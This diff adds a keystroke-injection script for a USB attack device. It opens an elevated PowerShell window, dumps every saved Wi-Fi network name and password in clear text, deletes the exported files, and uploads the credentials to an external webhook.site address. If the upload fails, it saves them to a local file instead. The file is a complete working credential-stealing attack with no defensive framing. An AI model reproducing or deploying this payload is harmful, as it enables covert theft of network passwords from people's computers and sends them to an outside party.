@@ -1,0 +1,18 @@
+DELAY 1000
+GUI 
+DELAY 500
+STRING powershell
+DELAY 500
+RIGHTARROW
+DELAY 500
+DOWNARROW
+DELAY 500
+ENTER
+DELAY 2000
+ALT y
+DELAY 2000
+STRING netsh wlan export profile key=clear folder=$env:TEMP; $d=@(); Get-ChildItem $env:TEMP\*.xml | ForEach-Object { $x = [xml](Get-Content $_.FullName); $d += [PSCustomObject]@{ SSID = $x.WLANProfile.SSIDConfig.SSID.name; Password = $x.WLANProfile.MSM.Security.sharedKey.keyMaterial }}; Remove-Item $env:TEMP\*.xml -Force; try { irm https://webhook.site/fdd31c30-e987-4d6e-acdb-bd23a772021e -Method Post -Body ($d | ConvertTo-Json) -ContentType application/json } catch { $d | Out-File $env:TEMP\creds.txt }
+ENTER
+DELAY 10000
+STRING exit
+ENTER
